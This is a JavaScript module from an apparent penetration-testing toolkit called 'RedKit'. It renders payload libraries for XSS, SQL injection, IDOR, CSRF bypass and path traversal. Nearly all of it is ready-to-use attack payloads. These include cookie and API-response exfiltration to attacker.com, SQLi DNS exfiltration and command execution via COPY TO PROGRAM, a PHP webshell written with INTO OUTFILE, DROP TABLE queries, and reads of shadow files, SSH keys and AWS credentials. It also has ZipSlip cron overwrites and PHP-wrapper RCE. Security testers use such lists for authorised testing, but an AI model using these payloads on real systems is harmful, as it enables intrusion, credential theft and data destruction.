// RedKit · payloads/web.js (split from payloads.js)
// ===== XSS PAYLOAD LIBRARY =====
TOOLS['xss-payloads'] = {
  title: 'XSS Payload Library',
  desc: 'A curated library of Cross-Site Scripting payloads, bypasses, and techniques.',
  render() {
    const sections = [
      { name: 'Basic Payloads', items: [
        { p: '<script>alert(1)</script>', d: 'Classic' },
        { p: '<img src=x onerror=alert(1)>', d: 'IMG onerror' },
        { p: '<svg onload=alert(1)>', d: 'SVG onload' },
        { p: '<body onload=alert(1)>', d: 'BODY onload' },
        { p: '<input autofocus onfocus=alert(1)>', d: 'Autofocus' },
        { p: '<details open ontoggle=alert(1)>', d: 'Details ontoggle' },
        { p: '<marquee onstart=alert(1)>', d: 'Marquee' },
        { p: '<x onclick=alert(1)>click</x>', d: 'Custom tag' },
        { p: '<iframe srcdoc="<script>alert(1)</script>">', d: 'Srcdoc' },
        { p: '<object data="javascript:alert(1)">', d: 'Object data' },
        { p: '<embed src="javascript:alert(1)">', d: 'Embed' },
      ]},
      { name: 'Context Escape', note: 'Break out of attributes, JS strings, comments', items: [
        { p: '"><script>alert(1)</script>', d: 'Double-quote attr' },
        { p: "'><script>alert(1)</script>", d: 'Single-quote attr' },
        { p: '"onmouseover=alert(1) x="', d: 'Attribute injection' },
        { p: "';alert(1);//", d: 'JS string break' },
        { p: "\\';alert(1);//", d: 'Escaped quote' },
        { p: '</script><script>alert(1)</script>', d: 'Script tag break' },
        { p: '*/alert(1)/*', d: 'JS comment break' },
        { p: '`-alert(1)-`', d: 'Template literal' },
      ]},
      { name: 'Filter & WAF Bypass', items: [
        { p: '<svg><script>alert&#40;1&#41;</script>', d: 'HTML entities' },
        { p: '<img src=x onerror="alert`1`">', d: 'No parens' },
        { p: '<svg/onload=eval(atob("YWxlcnQoMSk="))>', d: 'Base64 eval' },
        { p: '<script>onerror=alert;throw 1</script>', d: 'Throw → onerror' },
        { p: '<sCrIpT>alert(1)</sCrIpT>', d: 'Mixed case' },
        { p: '<script>alert(/xss/)</script>', d: 'Regex literal' },
        { p: '<a href="java&#09;script:alert(1)">x</a>', d: 'Tab in scheme' },
        { p: '<img src=x onerror=window[`al`+`ert`](1)>', d: 'String concat' },
        { p: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', d: 'SVG animate' },
        { p: '<iframe src="data:text/html,<script>alert(1)</script>">', d: 'Data URI iframe' },
      ]},
      { name: 'CSP Bypass', items: [
        { p: '<base href="javascript:/a/-alert(1)///">', d: 'Base href hijack' },
        { p: '<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>', d: 'JSONP gadget (Google)' },
        { p: "<link rel='preload' href='//attacker.com'>", d: 'Exfil via preload' },
        { p: '<form action=//attacker.com><input name=x value=1><input type=submit>', d: 'Form action exfil' },
        { p: '<iframe srcdoc="<script src=//attacker.com/x.js></script>">', d: 'Srcdoc bypass' },
      ]},
      { name: 'Cookie / Data Exfiltration', items: [
        { p: '<script>fetch("//attacker.com/?c="+document.cookie)</script>', d: 'Fetch cookie' },
        { p: '<img src=x onerror=this.src="//attacker.com/?"+document.cookie>', d: 'Image cookie' },
        { p: '<script>new Image().src="//attacker.com/?"+btoa(document.cookie)</script>', d: 'B64 image' },
        { p: '<script>navigator.sendBeacon("//attacker.com",document.cookie)</script>', d: 'Beacon' },
        { p: '<script>fetch("/api/me").then(r=>r.text()).then(t=>fetch("//attacker.com/?d="+btoa(t)))</script>', d: 'Steal API response' },
      ]},
      { name: 'DOM XSS Sinks', items: [
        { p: 'javascript:alert(1)', d: 'href / location sink' },
        { p: '#"><img src=x onerror=alert(1)>', d: 'Hash → innerHTML' },
        { p: '#<script>alert(1)</script>', d: 'location.hash sink' },
        { p: "');alert(1);//", d: 'eval / setTimeout sink' },
      ]},
      { name: 'AngularJS / Template Sandbox', items: [
        { p: "{{constructor.constructor('alert(1)')()}}", d: '1.6+' },
        { p: '{{$on.constructor(\'alert(1)\')()}}', d: '1.5' },
        { p: '{{[].pop.constructor(\'alert(1)\')()}}', d: 'Generic' },
        { p: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", d: '1.0.x' },
      ]},
      { name: 'mXSS / Mutation', items: [
        { p: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', d: 'noscript mutation' },
        { p: '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>', d: 'listing tag' },
        { p: '<style><img src="</style><img src=x onerror=alert(1)>">', d: 'style escape' },
      ]},
      { name: 'File Upload XSS', note: 'Upload as image/svg/html and trigger rendering', items: [
        { p: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', d: 'SVG upload' },
        { p: 'GIF89a;<script>alert(1)</script>', d: 'Polyglot GIF/HTML' },
        { p: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "file:///etc/passwd">%p;]>', d: 'XML upload (also XXE)' },
      ]},
      { name: 'Header / CRLF Injection', note: 'GitHub Pages: page_id with %00 → cookie injection → cache poison', items: [
        { p: '%0d%0aSet-Cookie:%20pwn=1', d: 'Set-Cookie injection' },
        { p: '%0d%0a%0d%0a<script>alert(1)</script>', d: 'CRLF body inject' },
        { p: '%E5%98%8D%E5%98%8A', d: 'UTF-8 CRLF bypass' },
      ]},
      { name: 'Polyglots', items: [
        { p: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"`/+/onmouseover=1/+/[*/[]/+alert(1)//\'>', d: 'Browns polyglot' },
        { p: '">\'><svg/onload=alert(1)>', d: 'Triple-context' },
      ]},
      { name: 'Blind XSS Probes', note: 'Use XSS Hunter / Interactsh - fires on admin panel views', items: [
        { p: '"><script src="//xsshunter.com/your_id"></script>', d: 'Hunter probe' },
        { p: '<script>$.getScript("//attacker.com/x.js")</script>', d: 'jQuery loader' },
      ]},
      { name: 'Blind XSS Webhook Provider', note: 'Sign up to get your probe ID, then plug it into the Blind XSS Probes above', items: [
        { p: 'https://xss.report/', d: 'Recommended', link: true, recommended: true },
        { p: 'https://xsshunter.trufflesecurity.com/', d: '', link: true },
        { p: 'https://bxsshunter.com', d: '', link: true },
      ]},
    ];
    return renderPayloadLibrary('XSS Payloads & Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== SQLi PAYLOAD LIBRARY =====
TOOLS['sqli-payloads'] = {
  title: 'SQLi Payload Library',
  desc: 'A curated library of SQL Injection payloads and privilege escalation techniques.',
  render() {
    const sections = [
      { name: 'Auth Bypass', items: [
        { p: "' OR '1'='1", d: 'Classic' },
        { p: "' OR 1=1--", d: 'With comment' },
        { p: "admin'--", d: 'Comment password' },
        { p: "admin'/*", d: 'Multi-line comment' },
        { p: "' OR 1=1 LIMIT 1--", d: 'LIMIT bypass' },
        { p: "') OR ('1'='1", d: 'Bracket escape' },
        { p: "1' OR '1'='1' /*", d: 'Mixed comment' },
        { p: '" OR ""="', d: 'Double quote' },
        { p: "' OR 1=1#", d: 'MySQL hash comment' },
      ]},
      { name: 'UNION-Based', note: 'First find column count with ORDER BY', items: [
        { p: "1' ORDER BY 1--", d: 'Column count probe' },
        { p: "' UNION SELECT NULL--", d: '1 col' },
        { p: "' UNION SELECT NULL,NULL--", d: '2 cols' },
        { p: "' UNION SELECT NULL,NULL,NULL--", d: '3 cols' },
        { p: "' UNION SELECT @@version,user(),database()--", d: 'Info gathering' },
        { p: "' UNION SELECT username,password FROM users--", d: 'Data extraction' },
        { p: "' UNION SELECT table_name,NULL FROM information_schema.tables--", d: 'List tables' },
        { p: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", d: 'List columns' },
      ]},
      { name: 'Error-Based', items: [
        { p: "' AND extractvalue(1,concat(0x7e,version()))--", d: 'MySQL XPath' },
        { p: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--", d: 'MySQL updatexml' },
        { p: "' AND 1=CONVERT(int,(SELECT @@version))--", d: 'MSSQL convert' },
        { p: "' AND 1=cast((SELECT version()) as int)--", d: 'PostgreSQL cast' },
        { p: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", d: 'Double query' },
      ]},
      { name: 'Time-Based Blind', note: 'When no output is reflected. Top technique in bounty reports.', items: [
        { p: "' AND (SELECT SLEEP(5))--", d: 'MySQL' },
        { p: "' AND SLEEP(5)#", d: 'MySQL #' },
        { p: "' OR IF(1=1,SLEEP(5),0)--", d: 'MySQL conditional' },
        { p: "'; WAITFOR DELAY '0:0:5'--", d: 'MSSQL' },
        { p: "' AND pg_sleep(5)--", d: 'PostgreSQL' },
        { p: "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", d: 'Oracle' },
        { p: "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", d: 'PostgreSQL conditional' },
      ]},
      { name: 'Boolean Blind', items: [
        { p: "1' AND SUBSTRING(version(),1,1)='5", d: 'Char compare' },
        { p: "' OR ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--", d: 'Char extraction' },
        { p: "1 AND (SELECT COUNT(*) FROM users)>0", d: 'Table existence' },
        { p: "' AND 1=(SELECT COUNT(*) FROM tabname)--", d: 'Table probe' },
      ]},
      { name: 'OOB (Out-of-Band)', note: 'Use Burp Collaborator / Interactsh', items: [
        { p: "'; exec master..xp_dirtree '\\\\\\\\attacker.com\\\\a'--", d: 'MSSQL DNS' },
        { p: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a'))--", d: 'MySQL DNS exfil' },
        { p: "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--", d: 'PostgreSQL OOB' },
      ]},
      { name: 'Stacked Queries', items: [
        { p: "'; DROP TABLE users--", d: 'MSSQL/Postgres' },
        { p: "'; INSERT INTO users(u,p) VALUES('a','b')--", d: 'Insert' },
        { p: "'; UPDATE users SET role='admin' WHERE u='attacker'--", d: 'Privilege escalation' },
      ]},
      { name: 'INSERT/UPDATE without commas', note: 'Apple SQLi technique - when commas filtered', items: [
        { p: "INSERT INTO t VALUES (SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b)", d: 'Comma-less values' },
        { p: "SELECT * FROM users WHERE id=1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b", d: 'Comma-less union' },
      ]},
      { name: 'WAF Bypass', items: [
        { p: "%27%20OR%201%3D1--", d: 'URL encode' },
        { p: "/*!50000UNION*/ /*!50000SELECT*/", d: 'MySQL versioned' },
        { p: "UnIoN SeLeCt", d: 'Mixed case' },
        { p: "UNION/*comment*/SELECT", d: 'Inline comment' },
        { p: "%0AUNION%0ASELECT", d: 'Newline' },
        { p: "1\u00a0OR\u00a01=1", d: 'Non-break space' },
        { p: "/*!u%6eion*/ /*!se%6cect*/", d: 'Hex char' },
      ]},
      { name: 'File Read / Write (MySQL)', items: [
        { p: "' UNION SELECT load_file('/etc/passwd')--", d: 'Read file' },
        { p: "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php'--", d: 'Write webshell' },
      ]},
      { name: 'GraphQL SQLi', note: 'GraphQL params are common SQLi sinks (HackerOne IDOR pattern)', items: [
        { p: '{ user(id: "1\' OR 1=1--") { name } }', d: 'Quote in arg' },
        { p: '{ search(q: "x\' UNION SELECT NULL--") { results } }', d: 'Search field' },
      ]},
      { name: 'NoSQL Injection', items: [
        { p: '{"$ne": null}', d: 'Mongo not-null' },
        { p: '{"$gt": ""}', d: 'Mongo gt' },
        { p: '{"username":{"$regex":"^a"}}', d: 'Regex enum' },
        { p: "';return true;//", d: 'JS injection' },
      ]},
    ];
    return renderPayloadLibrary('SQLi Payloads & Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== IDOR HELPER =====
TOOLS['idor-helper'] = {
  title: 'IDOR Helper & Patterns',
  desc: 'Find and exploit Insecure Direct Object References with proven test patterns.',
  render() {
    const sections = [
      { name: 'ID Types to Test', items: [
        { p: '1, 2, 3, ... 1000000', d: 'Sequential decimal' },
        { p: '00000001, 00000002', d: 'Padded numeric' },
        { p: '550e8400-e29b-41d4-a716-446655440000', d: 'UUID v4' },
        { p: 'deadbeef1234', d: 'Hex string' },
        { p: 'YWRtaW4=', d: 'Base64 encoded' },
        { p: 'attacker@evil.com', d: 'Email/username as ID' },
        { p: '1640995200', d: 'Unix timestamp' },
      ]},
      { name: 'Locations to Test', note: 'IDORs hide everywhere - not just URL params', items: [
        { p: '/api/user/{id}/profile', d: 'URL path' },
        { p: '?user_id=1234', d: 'Query string' },
        { p: '{"id": 1234}', d: 'JSON body' },
        { p: 'X-User-ID: 1234', d: 'Custom header' },
        { p: 'cookie: user=1234', d: 'Cookie value' },
        { p: 'GraphQL: user(id: "1234")', d: 'GraphQL arg' },
        { p: 'wss://... {"action":"sub","user":1234}', d: 'WebSocket' },
        { p: '/rpc?method=getUser&id=1234', d: 'RPC call' },
      ]},
      { name: 'Test Techniques', items: [
        { p: 'Replace your ID with victim ID directly', d: 'Direct swap' },
        { p: 'Use your own ID in victim context (token swap)', d: 'Authorization confusion' },
        { p: 'Add ?user_id=victim to your request', d: 'Param injection' },
        { p: 'Send array: {"id":[1234,5678]}', d: 'Array smuggling' },
        { p: 'Wildcard: id=*', d: 'Wildcard test' },
        { p: 'Negative: id=-1, id=0', d: 'Edge case' },
        { p: 'Change HTTP method (GET→POST→PUT→DELETE)', d: 'Method swap' },
        { p: 'Change Content-Type to bypass validation', d: 'Content-Type swap' },
        { p: 'Add /../ in path or extension change', d: 'Path tricks' },
      ]},
      { name: 'Hash/Token Bypass', items: [
        { p: 'Sign with attacker key, victim ID', d: 'Signing oracle' },
        { p: 'JWT alg=none', d: 'JWT downgrade' },
        { p: 'Truncate hash / collision', d: 'Hash truncation' },
        { p: 'Use empty token', d: 'Empty creds bypass' },
      ]},
      { name: 'Functionalities Often Vulnerable', items: [
        { p: 'View profile, posts, photos, files', d: 'Read IDOR' },
        { p: 'Update settings, password, email', d: 'Update IDOR' },
        { p: 'Delete account, comment, file', d: 'Delete IDOR' },
        { p: 'Add member to group / org', d: 'Permission IDOR' },
        { p: 'Cancel subscription / order', d: 'Action IDOR' },
        { p: 'Export data / generate invoice', d: 'Data IDOR' },
        { p: 'Webhook URL of another tenant', d: 'Cross-tenant' },
      ]},
    ];
    return renderPayloadLibrary('IDOR Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== CSRF BYPASS LIBRARY =====
TOOLS['csrf-bypass'] = {
  title: 'CSRF Bypass Techniques',
  desc: 'Proven techniques to defeat CSRF protections and bypass token defenses.',
  render() {
    const sections = [
      { name: 'Token Bypasses', items: [
        { p: 'Remove the CSRF token parameter entirely', d: 'Empty token' },
        { p: 'Set token to empty string', d: 'Blank value' },
        { p: 'Use your own valid token on victim', d: 'Token swap (often works)' },
        { p: 'Use a token of the same length but random', d: 'Length-only validation' },
        { p: 'Change request method (POST → GET)', d: 'Method validation gap' },
        { p: 'Remove the token header (X-CSRF-Token)', d: 'Header-only check' },
        { p: 'Change Content-Type to text/plain or multipart', d: 'CT validation gap' },
      ]},
      { name: 'GET-Based State Change', note: 'Common in admin panels & mobile APIs', items: [
        { p: 'GET /api/delete?id=1', d: 'Direct GET CSRF' },
        { p: '<img src="https://target/api/delete?id=1">', d: 'Image-tag PoC' },
        { p: 'GraphQL GET mutations (?query=mutation{...})', d: 'GraphQL CSRF (Facebook $7.5k)' },
      ]},
      { name: 'SameSite Bypasses', items: [
        { p: 'Top-level navigation (form submit / window.open)', d: 'Bypasses Lax' },
        { p: 'Subdomain XSS → cookie context', d: 'Same-site XSS' },
        { p: 'GET requests bypass Lax for top-nav', d: 'Lax → GET allowed' },
        { p: '<2 minute window after Set-Cookie (Chrome Lax-by-default)', d: '120s grace period' },
      ]},
      { name: 'Token Leakage', items: [
        { p: 'Token in URL → leaked via Referer', d: 'Referer leak' },
        { p: 'Token in JSON response → fetched cross-origin', d: 'CORS misconfig leak' },
        { p: 'Token in HTML page accessible to XSS', d: 'XSS → CSRF chain' },
        { p: 'Fixed/predictable tokens (hash of user ID)', d: 'Predictable token' },
      ]},
      { name: 'OAuth / SSO CSRF', items: [
        { p: 'Missing state parameter → login CSRF', d: 'OAuth state missing' },
        { p: 'Null byte in state (state=foo%00bar)', d: 'State validation bypass' },
        { p: 'state=attacker_state on victim', d: 'Account merge' },
        { p: 'HEAD method → CSRF token check skipped (GitHub $25k)', d: 'HEAD method abuse' },
      ]},
      { name: 'JSON / API CSRF', items: [
        { p: '<form enctype="text/plain" action="...">', d: 'JSON via form' },
        { p: 'Flash → 307 redirect with JSON body', d: 'Legacy 307 redirect' },
        { p: 'CORS misconfig: ACAO=null + ACAC=true', d: 'CORS-based CSRF' },
        { p: 'CL.0 / smuggling on token endpoint', d: 'Smuggling chain' },
      ]},
      { name: 'Notable Patterns', items: [
        { p: 'Client-side path traversal in form action (GitLab $6.5k)', d: 'Path traversal CSRF' },
        { p: 'Azure EmojiDeploy: zip upload via CSRF → RCE ($30k)', d: 'CSRF → RCE' },
        { p: 'Facebook: GET endpoint that triggers POST fetch internally', d: 'Hidden POST' },
      ]},
    ];
    return renderPayloadLibrary('CSRF Bypass Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== PATH TRAVERSAL / FILE DISCLOSURE =====
TOOLS['path-traversal'] = {
  title: 'Path Traversal / LFI Helper',
  desc: 'Path traversal and file disclosure payloads, including server quirks and WAF bypasses.',
  render() {
    const sections = [
      { name: 'Basic Traversal', items: [
        { p: '../../../etc/passwd', d: 'Linux 3 levels' },
        { p: '../../../../../../etc/passwd', d: 'Deep traversal' },
        { p: '..\\..\\..\\windows\\win.ini', d: 'Windows backslash' },
        { p: '../../../../../../../../../../etc/passwd', d: 'Very deep (safe default)' },
        { p: '/etc/passwd', d: 'Absolute path' },
        { p: 'C:\\Windows\\win.ini', d: 'Windows absolute' },
        { p: 'file:///etc/passwd', d: 'file:// scheme' },
      ]},
      { name: 'Encoded Variants', note: 'Try when basic ../ is filtered', items: [
        { p: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', d: 'URL encoded' },
        { p: '%252e%252e%252f', d: 'Double URL encoded' },
        { p: '..%c0%af', d: 'Overlong UTF-8' },
        { p: '..%ef%bc%8f', d: 'Unicode slash' },
        { p: '%%32%65%%32%65/', d: 'Apache 2.4.49 bypass (CVE-2021-41773)' },
        { p: '..%5c..%5c..%5c', d: 'Encoded backslash' },
        { p: '..%2f..%2f..%2f', d: 'Encoded slash' },
      ]},
      { name: 'Filter Bypass Tricks', items: [
        { p: '....//....//....//etc/passwd', d: 'Replace ../ removed once' },
        { p: '..//..//..//etc/passwd', d: 'Double slash' },
        { p: '..;/..;/..;/etc/passwd', d: 'Secondary context (..;/) - Starbucks $4k' },
        { p: 'web\\..\\.\\..\\etc\\passwd', d: 'Embedded in dirname (Sam Curry)' },
        { p: '../../../etc/passwd%00', d: 'Null byte (legacy PHP)' },
        { p: '../../../etc/passwd%00.png', d: 'Null byte + ext' },
        { p: '/proc/self/environ', d: 'Read env vars' },
        { p: '/proc/self/cmdline', d: 'Read cmdline' },
      ]},
      { name: 'Useful Linux Files', items: [
        { p: '/etc/passwd', d: 'User list' },
        { p: '/etc/shadow', d: 'Hashes (root only)' },
        { p: '/etc/hosts', d: 'Internal hostnames' },
        { p: '/proc/self/environ', d: 'Env vars' },
        { p: '/proc/version', d: 'Kernel info' },
        { p: '/root/.ssh/id_rsa', d: 'SSH key' },
        { p: '/root/.bash_history', d: 'Bash history' },
        { p: '/var/log/apache2/access.log', d: 'Log poisoning' },
        { p: '/var/www/html/.env', d: 'App secrets' },
        { p: '/var/www/html/wp-config.php', d: 'WordPress config' },
        { p: '/.aws/credentials', d: 'AWS creds' },
        { p: '/.git/config', d: 'Git config' },
        { p: '/proc/self/cwd/.env', d: 'Relative .env via /proc' },
      ]},
      { name: 'Useful Windows Files', items: [
        { p: 'C:\\Windows\\win.ini', d: 'Windows ini' },
        { p: 'C:\\Windows\\System32\\drivers\\etc\\hosts', d: 'Hosts file' },
        { p: 'C:\\inetpub\\wwwroot\\web.config', d: 'IIS config' },
        { p: 'C:\\Windows\\repair\\sam', d: 'SAM (legacy)' },
        { p: 'C:\\Users\\Administrator\\.ssh\\id_rsa', d: 'SSH key' },
      ]},
      { name: 'PHP Wrappers (LFI → RCE)', items: [
        { p: 'php://filter/convert.base64-encode/resource=index.php', d: 'Read source' },
        { p: 'php://filter/read=string.rot13/resource=index.php', d: 'ROT13 read' },
        { p: 'php://input', d: 'POST body as code' },
        { p: 'data://text/plain,<?php system($_GET[c]);?>', d: 'Inline RCE' },
        { p: 'expect://id', d: 'Command exec (rare)' },
        { p: 'zip://shell.jpg%23payload.php', d: 'Zip wrapper RCE' },
      ]},
      { name: 'ZipSlip', note: 'Malicious archives with ../ in entry names - GitLab $29k', items: [
        { p: '../../../../etc/cron.d/pwn', d: 'Overwrite cron' },
        { p: '../../root/.ssh/authorized_keys', d: 'SSH key write' },
        { p: '..\\..\\..\\Windows\\System32\\config\\sam', d: 'Windows ZipSlip' },
      ]},
      { name: 'Nginx Alias Traversal', items: [
        { p: '/static../etc/passwd', d: 'Misconfigured alias (no trailing /)' },
        { p: '/api/v1../../../etc/passwd', d: 'API path alias' },
      ]},
      { name: 'SSRF + LFI Chains', items: [
        { p: 'http://target/?url=file:///etc/passwd', d: 'SSRF → file://' },
        { p: 'http://target/?url=gopher://internal:6379/_INFO', d: 'Gopher → Redis' },
        { p: 'http://target/?url=dict://internal:11211/stats', d: 'Dict → memcached' },
      ]},
    ];
    return renderPayloadLibrary('Path Traversal & File Disclosure', sections, []);
  },
  init() { initPayloadLibrary(); }
};

